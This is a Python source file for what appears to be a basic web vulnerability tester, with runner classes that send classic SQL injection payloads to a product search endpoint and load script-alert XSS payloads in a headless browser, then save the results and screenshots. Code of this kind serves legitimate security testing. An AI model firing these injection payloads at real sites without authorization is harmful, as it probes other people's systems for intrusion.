from abc import ABC, abstractmethod
from playwright.async_api import async_playwright
import aiohttp
import json
from pathlib import Path
import pandas as pd


class BaseExploitRunner(ABC):
    def __init__(self, target_url: str, results_dir: Path):
        self.target_url = target_url
        self.results_dir = results_dir

    @abstractmethod
    async def run(self, vulnerability: str, details: str) -> dict:
        pass

    async def save_results(self, vulnerability: str, results: dict):
        timestamp = pd.Timestamp.now().strftime("%Y%m%d_%H%M%S")
        output_file = (
            self.results_dir
            / f"{timestamp}_{vulnerability.replace(' ', '_')}_results.json"
        )
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)


class SQLInjectionRunner(BaseExploitRunner):
    async def run(self, vulnerability: str, details: str) -> dict:
        async with aiohttp.ClientSession() as session:
            # Basic SQL injection tests
            payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"]
            results = []

            for payload in payloads:
                async with session.get(
                    f"{self.target_url}/api/products/search?q={payload}"
                ) as response:
                    results.append(
                        {
                            "payload": payload,
                            "status": response.status,
                            "response_size": len(await response.text()),
                        }
                    )

            return {"test_results": results}


class XSSRunner(BaseExploitRunner):
    async def run(self, vulnerability: str, details: str) -> dict:
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()

            # Basic XSS payloads
            payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
            ]

            results = []
            for payload in payloads:
                try:
                    await page.goto(f"{self.target_url}/search?q={payload}")
                    # Take screenshot of potential XSS
                    screenshot_path = self.results_dir / f"xss_test_{payload[:10]}.png"
                    await page.screenshot(path=str(screenshot_path))
                    results.append(
                        {"payload": payload, "screenshot": str(screenshot_path)}
                    )
                except Exception as e:
                    results.append({"payload": payload, "error": str(e)})

            await browser.close()
            return {"test_results": results}
